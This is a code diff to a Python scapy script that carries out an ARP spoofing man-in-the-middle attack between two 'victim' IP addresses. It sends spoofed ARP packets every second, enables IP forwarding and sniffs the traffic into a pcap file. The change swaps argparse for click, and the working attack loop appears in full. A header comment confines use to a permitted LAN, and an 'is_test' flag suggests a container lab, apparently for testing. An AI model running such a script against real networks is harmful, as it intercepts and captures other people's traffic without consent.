@@ -4,13 +4,13 @@
 #  only use in LAN where you allowed to us such SW
 
 from scapy.all import Ether, ARP, srp, send, sniff, wrpcap
-import argparse
 import time
 import os
 import sys
 import subprocess
 import platform
 import logging
+import click
 from threading import Thread
 
 from ipaddress import IPv4Address
@@ -189,63 +189,51 @@ def capture(file: str, timeout: int) -> None:
     Scapy is not intend/optimized for packet capturing
     """
     if os.path.exists(file):
-        print("[+] Delete existing Capture file")
+        click.echo("[+] Delete existing Capture file")
         os.unlink(file)
 
-    print("[+] Start sniffing...")
+    click.echo("[+] Start sniffing...")
     pkt = sniff(timeout=timeout)
 
-    print("[+] Stop sniffing")
+    click.echo("[+] Stop sniffing")
     wrpcap(file, pkt)
 
 
-if __name__ == "__main__":
+@click.group()
+def main_cli():
+    pass
 
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        '--target_ip1', type=str, required=True, help='IP address for victim 1'
-    )
-    parser.add_argument(
-        '--target_ip2', type=str, required=True, help='IP address for victim 2'
-    )
-    parser.add_argument(
-        '--capture_time',
-        type=int,
-        default=30,
-        help='How long it shall capture traffic between victims',
-    )
-    parser.add_argument(
-        '--capture_path',
-        type=str,
-        default="sniff.pcap",
-        help='Path inclusive file name to save pcap file',
-    )
-    parser.add_argument(
-        '--is_test',
-        default=False,
-        action='store_true',
-        help='Whether script is executed in podman',
-    )
-    args = parser.parse_args()
 
-    if not args.is_test:
+@main_cli.command()
+@click.argument('target_ip1', type=str)
+@click.argument('target_ip2', type=str)
+@click.argument('capture_time', type=int)
+@click.argument('capture_path', type=str)
+@click.argument('is_test', default=False, type=bool)
+def run(
+    target_ip1: str,
+    target_ip2: str,
+    capture_time: int,
+    capture_path: str,
+    is_test: bool = False,
+):
+
+    if not is_test:
         # Only execute if the script is NOT executed in a container.
         # enable ip forwarding
         enable_ip_route()
 
     # Run capturing in different thread since it's blocking
-    capture_thread = Thread(
-        target=capture, args=(args.capture_path, args.capture_time)
-    )
+    capture_thread = Thread(target=capture, args=(capture_path, capture_time))
     capture_thread.start()
 
     # Send malicious packages every second
     try:
         while capture_thread.is_alive():
             # telling the target1 that we are the target2
-            spoof(args.target_ip1, args.target_ip2)
+            spoof(target_ip1, target_ip2)
             # telling the target2 that we are the target1
-            spoof(args.target_ip2, args.target_ip1)
+            spoof(target_ip2, target_ip1)
 
             # sleep for one second
             time.sleep(1)
@@ -254,10 +242,14 @@ if __name__ == "__main__":
         pass
     finally:
         # Restore the network to the legit state
-        restore(args.target_ip1, args.target_ip2)
-        restore(args.target_ip2, args.target_ip1)
+        restore(target_ip1, target_ip2)
+        restore(target_ip2, target_ip1)
 
         # TODO: Force it to quit? With timeout?
         #  Keep it as it is? Before or after restore?
         # Wait for the sniffing to be completed
         capture_thread.join()
+
+
+if __name__ == '__main__':
+    main_cli()
